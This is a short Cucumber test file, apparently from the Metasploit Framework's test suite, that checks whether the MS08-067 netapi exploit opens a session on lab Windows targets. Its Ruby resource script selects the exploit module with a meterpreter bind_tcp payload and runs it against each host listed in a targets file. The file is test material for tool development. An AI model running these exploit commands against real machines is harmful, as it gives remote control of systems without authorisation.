@targets
Feature: MS08-067 netapi

  Background:
    Given a directory named "home"
    And I cd to "home"
    And a mocked home directory

  Scenario: The MS08-067 should get a session with bind_tcp
    Given I ready the windows targets
    And a file named "ms08-067.rc" with:
      """
        <ruby>
          hosts = YAML.load File.open Rails.root.join('features', 'support', 'targets.yml')
          self.run_single('use exploit/windows/smb/ms08_067_netapi')
          self.run_single('set payload windows/meterpreter/bind_tcp')
          hosts['windows'].each do |host|
            self.run_single("set RHOST #{host['ip']}")
            self.run_single('run')
            sleep 1
          end
          
        </ruby>
      """
    When I run `msfconsole --environment test -q -r ms08-067.rc -x exit`
    Then the output should contain "[*] Exploit completed, 1 session was created."
